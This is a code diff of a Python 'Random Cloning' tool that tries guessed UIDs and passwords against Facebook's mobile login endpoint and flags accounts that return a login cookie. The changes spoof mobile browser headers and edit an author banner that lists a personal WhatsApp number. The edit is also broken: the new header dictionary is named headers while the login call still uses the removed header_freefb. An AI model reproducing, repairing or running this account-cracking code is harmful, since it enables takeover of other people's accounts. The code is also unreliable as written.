@@ -4,7 +4,7 @@ import os,sys,time,json,random,re,string,platform,base64,uuid
 os.system("git pull")
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
- #import requests as ress
+import requests as ress
 from datetime import date
 from datetime import datetime
 from time import sleep
@@ -24,7 +24,7 @@ def cek_apk(session,coki):
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
-        #print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
+        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
     else:
         print(f'\r[🌺] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
         for i in range(len(game)):
@@ -102,9 +102,9 @@ logo =("""\033[0;92m
 \033[0;93m╠══[Author:=======================> \33[1;38mMR. SHANTO\33[1;38m       ║\033[1;31m
 ╠══[Facebook:=====================> SHANTO MAFIA      ║  \033[1;97m
 ╠══[Github:=======================> \33[1;38mSHANTO-MAFIA      ║\33[1;34m
-╠══[Whatsapp:=====================> 01812631929     ║\33[1;35m
+╠══[Whatsapp:=====================> 01608843956     ║\33[1;35m
 ╠══[TOOLS:========================> Random Cloning  ║ \33[1;32m
-╠══[VERSION:======================> 0.1          ║\033[1;35m
+╠══[VERSION:======================> 1.0.2           ║\033[1;35m
 \033[0;92m╚═══════════════════════════════════════════════════╝\033[1;31m
     """) 
 loop = 0
@@ -229,22 +229,21 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'mbasic.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            # 'cookie': 'datr=zwaiY8oIpRJmusfwcUYR3gcl; sb=zwaiY5XKI6dYvdiAT8MfIAzF; wd=979x1831; dpr=2.34375; fr=0FGFgDcD2x3MSPEbJ..BjogbP.Fh.AAA.0.0.Bjt7jq.AWXveghp-AI',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            headers = {'authority': 'free.facebook.com',
+     'method': 'GET',
+    'scheme': 'https', 
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
